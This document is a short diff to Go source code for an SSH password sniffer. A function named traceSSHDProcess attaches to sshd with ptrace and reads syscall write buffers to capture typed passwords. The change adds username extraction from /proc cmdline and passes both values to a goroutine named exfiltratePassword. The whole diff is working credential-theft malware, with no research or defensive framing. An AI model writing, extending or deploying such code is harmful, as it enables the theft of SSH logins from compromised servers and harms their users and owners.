@@ -83,7 +83,7 @@ func traceSSHDProcess(pid int) {
 		fmt.Println("Error waiting for the process:", err)
 		return
 	}
-
+	var username string
 	for {
 		err = syscall.PtraceSyscall(pid, 0)
 		if err != nil {
@@ -115,12 +115,16 @@ func traceSSHDProcess(pid int) {
 					fmt.Println("Error reading buffer:", err)
 					return
 				}
-
+				cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+				matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
+				if len(matches) == 2 {
+					username = string(matches[1])
+				}
 				if reg.Rdi == 5 && len(buffer) < 250 && len(buffer) > 0 && string(buffer) != "" {
 					excludeString := "\\x00\\x00\\x00.\\f"
 					if !regexp.MustCompile(excludeString).MatchString(string(buffer)) {
 						cleanedBuffer := strings.TrimLeft(string(buffer), "\n")
-						go exfiltratePassword(strings.TrimLeft(string(cleanedBuffer), "\n"))
+						go exfiltratePassword(strings.TrimLeft(string(cleanedBuffer), "\n"), username)
 					}
 				}
 
